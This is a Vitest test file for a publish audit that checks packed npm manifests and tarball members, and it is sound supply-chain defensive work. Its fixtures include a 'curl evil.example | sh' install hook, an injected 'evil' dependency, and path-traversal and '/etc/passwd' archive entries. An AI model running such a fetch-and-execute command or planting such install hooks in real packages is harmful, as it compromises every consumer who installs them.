import { describe, expect, it } from "vitest";
import { auditPublishedManifest, auditTarMembers } from "../../scripts/packed-publish-contract.mjs";

/**
 * Two gaps in the per-package tarball audits, both reachable from the `prepack` script that runs in
 * the unprivileged prepare job:
 *
 * - `scripts` was never inspected, so a `postinstall` added at pack time would have shipped and run
 *   on every consumer's machine at `npm install`.
 * - members were listed by name only, so a symlink or hardlink named `dist/index.js` was
 *   indistinguishable from the file it replaced.
 */

const SDK_SOURCE = {
  name: "@fairux/sdk",
  version: "0.1.0-beta.2",
  type: "module",
  license: "Apache-2.0",
  main: "./dist/index.js",
  exports: { ".": { types: "./dist/index.d.ts", import: "./dist/index.js" } },
  files: ["dist", "README.md", "LICENSE", "NOTICE"],
  publishConfig: { access: "public" },
  engines: { node: "^22.18.0 || >=24.11.0" },
  scripts: { build: "tsdown", prepack: "pnpm build", prepublishOnly: "node guard.mjs" },
};

const CLI_SOURCE = {
  name: "fairux",
  version: "0.1.0-beta.1",
  type: "module",
  license: "Apache-2.0",
  bin: { fairux: "./dist/index.js" },
  files: ["dist", "README.md", "LICENSE", "NOTICE"],
  engines: { node: "^22.18.0 || >=24.11.0" },
  scripts: { build: "tsdown", prepack: "pnpm build" },
  dependencies: { commander: "14.0.1" },
};

const auditSdk = (overrides: Record<string, unknown> = {}, source = SDK_SOURCE) =>
  auditPublishedManifest({
    kind: "sdk",
    manifest: { ...SDK_SOURCE, ...overrides },
    sourceManifest: source,
  });

const auditCli = (overrides: Record<string, unknown> = {}, source = CLI_SOURCE) =>
  auditPublishedManifest({
    kind: "cli",
    manifest: { ...CLI_SOURCE, ...overrides },
    sourceManifest: source,
  });

describe("published manifest — install hooks", () => {
  it.each(["preinstall", "install", "postinstall", "preprepare", "prepare", "postprepare"])(
    "refuses a packed %s script",
    (name) => {
      const scripts = { ...SDK_SOURCE.scripts, [name]: "curl evil.example | sh" };
      expect(auditSdk({ scripts }).join("\n")).toMatch(
        new RegExp(`packed manifest defines an install-time script: ${name}`),
      );
    },
  );

  it("refuses an install hook that is in the checkout too, naming both", () => {
    const scripts = { ...CLI_SOURCE.scripts, postinstall: "node setup.mjs" };
    const failures = auditCli({ scripts }, { ...CLI_SOURCE, scripts });
    expect(failures).toContain("packed manifest defines an install-time script: postinstall");
    expect(failures).toContain("source manifest defines an install-time script: postinstall");
  });

  it("allows prepack and prepublishOnly, which never run on install", () => {
    expect(auditSdk()).toEqual([]);
    expect(auditCli()).toEqual([]);
  });

  it("refuses a rewritten script body", () => {
    expect(auditSdk({ scripts: { ...SDK_SOURCE.scripts, build: "node evil.mjs" } })).toContain(
      "packed manifest build script does not match the source manifest",
    );
  });

  it("refuses a script the checkout does not declare", () => {
    expect(auditSdk({ scripts: { ...SDK_SOURCE.scripts, deploy: "node deploy.mjs" } })).toContain(
      "packed manifest adds a script the checkout does not have: deploy",
    );
  });

  it("accepts the publish-lifecycle scripts being stripped, because pnpm strips them", () => {
    // Verified against real `pnpm pack` output for both packages: `prepack` and `prepublishOnly`
    // are removed from the published manifest. A plain deep-equal would fail every release.
    expect(auditSdk({ scripts: { build: "tsdown" } })).toEqual([]);
  });

  it("refuses a stripped script that is not a publish-lifecycle one", () => {
    expect(auditSdk({ scripts: { prepack: SDK_SOURCE.scripts.prepack } })).toContain(
      "packed manifest is missing the build script",
    );
  });
});

describe("published manifest — what consumers load", () => {
  it.each(["main", "exports", "files", "publishConfig", "type", "license", "engines"])(
    "refuses a rewritten %s for the SDK",
    (field) => {
      expect(auditSdk({ [field]: { hijacked: true } })).toContain(
        `packed manifest ${field} does not match the source manifest`,
      );
    },
  );

  it.each(["bin", "files", "type", "license", "engines"])(
    "refuses a rewritten %s for the CLI",
    (field) => {
      expect(auditCli({ [field]: "./evil.js" })).toContain(
        `packed manifest ${field} does not match the source manifest`,
      );
    },
  );

  it.each(["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"])(
    "refuses an added %s entry",
    (field) => {
      expect(auditCli({ [field]: { ...(CLI_SOURCE as never)[field], evil: "1.0.0" } })).toContain(
        `packed manifest ${field} adds evil, which the checkout does not declare`,
      );
    },
  );

  it("refuses a dropped runtime dependency", () => {
    expect(auditCli({ dependencies: {} })).toContain(
      "packed manifest dependencies drops commander",
    );
  });

  it("refuses a widened runtime range", () => {
    expect(auditCli({ dependencies: { commander: "*" } })).toContain(
      "packed manifest dependencies range for commander does not match the source manifest",
    );
  });

  it("accepts a workspace range the packer resolved, because pnpm resolves them", () => {
    // Verified against real `pnpm pack` output: `workspace:*` becomes a concrete version.
    const source = { ...CLI_SOURCE, devDependencies: { "@fairux/core": "workspace:*" } };
    expect(auditCli({ devDependencies: { "@fairux/core": "0.0.0" } }, source)).toEqual([]);
  });

  it("refuses an unresolved workspace range, which no consumer can install", () => {
    const source = { ...CLI_SOURCE, dependencies: { "@fairux/core": "workspace:*" } };
    expect(auditCli({ dependencies: { "@fairux/core": "workspace:*" } }, source)).toContain(
      "packed manifest dependencies publishes an unresolved workspace range for @fairux/core",
    );
  });

  it("refuses a workspace range in a map the checkout declared concretely", () => {
    expect(auditCli({ dependencies: { commander: "workspace:*" } })).toContain(
      "packed manifest dependencies publishes an unresolved workspace range for commander",
    );
  });

  it("refuses a dropped exports map for the SDK", () => {
    const failures = auditSdk({ exports: undefined });
    expect(failures).toContain("packed manifest has no exports map");
  });

  it("does not require an exports map for the CLI, which ships a bin", () => {
    expect(auditCli()).toEqual([]);
  });

  it("refuses a renamed package", () => {
    expect(auditSdk({ name: "@evil/sdk" }).join("\n")).toMatch(
      /packed manifest name is @evil\/sdk/,
    );
  });

  it("refuses a private packed manifest", () => {
    expect(auditSdk({ private: true })).toContain("packed manifest is marked private");
  });

  it("refuses an unknown package kind rather than passing it", () => {
    expect(
      auditPublishedManifest({
        kind: "figma" as "sdk",
        manifest: SDK_SOURCE,
        sourceManifest: SDK_SOURCE,
      }),
    ).toEqual(["unknown package kind: figma"]);
  });
});

describe("archive members", () => {
  const file = (name: string) => ({ name, type: "file", linkname: "" });

  it("accepts ordinary files under package/", () => {
    expect(auditTarMembers([file("package/package.json"), file("package/dist/index.js")])).toEqual(
      [],
    );
  });

  it("refuses an empty archive", () => {
    expect(auditTarMembers([])).toEqual(["tarball has no members"]);
  });

  it.each([
    ["symlink", "symlink"],
    ["hardlink", "hardlink"],
    ["character-device", "character-device"],
    ["block-device", "block-device"],
    ["fifo", "fifo"],
    ["directory", "directory"],
    ["pax-extended-header", "pax-extended-header"],
    ["unknown", "unknown"],
  ])("refuses a %s member", (type) => {
    expect(
      auditTarMembers([
        file("package/package.json"),
        { name: "package/dist/index.js", type, linkname: "" },
      ]).join("\n"),
    ).toMatch(new RegExp(`is a ${type}, not a regular file`));
  });

  it("refuses a symlink even when it points at something innocuous", () => {
    expect(
      auditTarMembers([{ name: "package/dist/index.js", type: "symlink", linkname: "./real.js" }])
        .length,
    ).toBe(1);
  });

  it.each([
    ["/etc/passwd", /absolute path/],
    ["C:\\Windows\\system32", /absolute path/],
    ["package/../../evil.js", /escapes its root/],
    ["package\\dist\\index.js", /backslash/],
    ["dist/index.js", /outside the package\/ root/],
  ])("refuses the path %j", (name, pattern) => {
    expect(auditTarMembers([file(name)]).join("\n")).toMatch(pattern);
  });

  it("refuses a regular file carrying a link target", () => {
    expect(
      auditTarMembers([{ name: "package/x.js", type: "file", linkname: "package/y.js" }]),
    ).toContain("tarball member package/x.js carries a link target");
  });

  it("reports every bad member, not only the first", () => {
    const failures = auditTarMembers([
      { name: "package/a", type: "symlink", linkname: "/etc/passwd" },
      { name: "package/b", type: "directory", linkname: "" },
      file("/absolute"),
    ]);
    for (const name of ["package/a", "package/b", "/absolute"]) {
      expect(failures.some((failure) => failure.includes(name))).toBe(true);
    }
  });

  it("reports every rule a single member breaks", () => {
    // `/absolute` is both an absolute path and outside `package/`; naming one and stopping would
    // send whoever fixes it back for a second round.
    expect(auditTarMembers([file("/absolute")])).toHaveLength(2);
  });
});
